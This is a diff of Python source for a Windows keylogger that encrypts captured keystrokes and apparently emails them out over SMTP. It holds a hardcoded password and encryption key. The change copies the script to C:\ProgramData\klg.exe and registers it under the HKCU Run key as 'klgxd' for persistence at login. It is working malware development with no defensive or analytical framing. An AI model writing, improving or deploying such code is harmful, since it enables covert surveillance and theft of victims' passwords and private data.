@@ -3,6 +3,7 @@ from cryptography.fernet import Fernet
 from smtplib import SMTP_SSL as SMTP
 from email.mime.text import MIMEText
 from os import path, environ
+from os import system as cmd
 from sys import argv
 from winreg import HKEY_CURRENT_USER,OpenKey,\
 QueryValueEx,SetValueEx,CloseKey,KEY_ALL_ACCESS,REG_SZ
@@ -14,8 +15,6 @@ PASSWORD = "Hg*VWa,N~@0'"
 clave = b'W3NFJwDhdDLeE48araLk2P_kETmFjPhct-kif7QhgI4='
 
 keys,count = [],0
-path = environ['appdata'] +'\\processmanager.txt'
-
 
 def cifrar(texto, clave): return Fernet(clave).encrypt(texto)
 
@@ -74,15 +73,14 @@ def write_file(keys):
 
 def add_to_startup():
     script_path = path.realpath(argv[0])
-    bat_path = path.splitext(script_path)[0] + '.bat'
+    bat_path = "C:\\ProgramData\\klg.exe"
+
+    cmd(f"copy {script_path} {bat_path}")
 
     # Create the batch file to run the script
-    with open(bat_path, 'w') as bat_file:
-        bat_file.write(f'@echo off\npythonw "{script_path}"')
-
     key = HKEY_CURRENT_USER
     key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-    entry_name = "MyPythonScript"
+    entry_name = "klgxd"
 
     try:
         open_key = OpenKey(key, key_value, 0, KEY_ALL_ACCESS)
